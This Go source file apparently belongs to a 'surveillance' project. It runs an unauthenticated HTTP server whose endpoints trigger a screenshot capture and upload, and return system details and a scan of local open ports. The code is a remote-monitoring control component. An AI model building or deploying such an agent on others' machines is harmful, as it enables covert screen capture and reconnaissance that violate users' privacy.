package server

import (
	"fmt"
	"net"
	"net/http"
	"runtime"
	screenmodul "surveillance/screen_modul"
)

func Run() {
	http.HandleFunc("/MakeScreenshot", func(w http.ResponseWriter, r *http.Request) {
		screenmodul.MakeScreenshot()
		fmt.Fprintf(w, "Screenshot has been taken and uploaded successfully")
	})

	http.HandleFunc("/GetData", func(w http.ResponseWriter, r *http.Request) {
		data := getData()
		fmt.Fprintf(w, data)
	})
	http.HandleFunc("/GetHistory", func(w http.ResponseWriter, r *http.Request) {
		//
	})

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		fmt.Println("Server bad starts")
	} else {
		fmt.Println("Server is running on port 8080")
	}

}

func getData() string {
	systemInfo := fmt.Sprintf("\nOperating System: %s\nArchitecture: %s\nNumber of CPUs: %d\nGo Version: %s\n", runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version())
	ports := []string{"22", "25", "53", "80", "88", "110", "123", "137", "3389", "8080"}

	var openPorts string
	for _, port := range ports {
		conn, err := net.Dial("tcp", fmt.Sprintf("localhost:%s", port))
		if err != nil {
			openPorts += fmt.Sprintf("Port %s is closed\n", port)
		} else {
			openPorts += fmt.Sprintf("Port %s is open\n", port)
			conn.Close()
		}
	}
	openPorts += "\n"

	return systemInfo + openPorts
}
